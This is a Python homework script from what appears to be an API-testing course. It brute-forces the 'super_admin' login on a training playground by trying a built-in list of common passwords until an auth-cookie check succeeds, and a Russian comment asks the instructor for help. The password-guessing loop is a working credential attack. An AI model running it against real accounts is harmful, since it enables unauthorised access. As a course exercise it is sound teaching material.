import requests

"""
Использовал модуль get_common_passwords_list в дебагере. К сожалению, не понял, как имея такой модуль, 
передать список паролей в этот модуль. Понимаю, что это выходит за рамки курса, 
но за подсказку (с небольшим примером), буду благодарен =)
"""

passwords_list = ['ninja', 'password', '123456789', 'princess', 'master', 'freedom', 'abc123', '1234567', 'welcome',
                  'hello', 'adobe123', 'donald', '654321', '111111', 'access', 'whatever', '1234', 'superman',
                  '888888', 'Football', '555555', '7777777', '666666', '12345', 'hottie', 'zaq1zaq1', 'login', 'admin',
                  '!@#$%^&*', '123456', 'passw0rd', '696969', 'shadow', 'baseball', 'jesus', 'password1', 'lovely',
                  'aa123456', '1q2w3e4r', 'football', 'photoshop', 'bailey', '123123', 'solo', '1qaz2wsx',
                  'sunshine', 'mustang', 'starwars', 'iloveyou', 'letmein', 'qwerty123', 'flower', 'qazwsx', '123qwe',
                  'qwerty', 'michael', 'loveme', '121212', 'qwertyuiop', 'batman', '12345678', '1234567890', 'monkey',
                  'azerty', '000000', 'trustno1', 'ashley', 'dragon', 'charlie']

url_get_secret_password_homework = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework"
url_check_auth_cookie = "https://playground.learnqa.ru/ajax/api/check_auth_cookie"

if __name__ == '__main__':
    for password in passwords_list:
        pay_load = {"login": "super_admin", "password": password}
        response_start = requests.post(url_get_secret_password_homework, data=pay_load)
        cookie_d = dict(response_start.cookies)
        response_cookie = requests.post(url_check_auth_cookie, cookies=cookie_d)
        print(password)
        print(cookie_d)
        print(response_cookie.text + "\n")

        if response_cookie.text == "You are authorized":
            print("Correct password: %s" % password)
            break



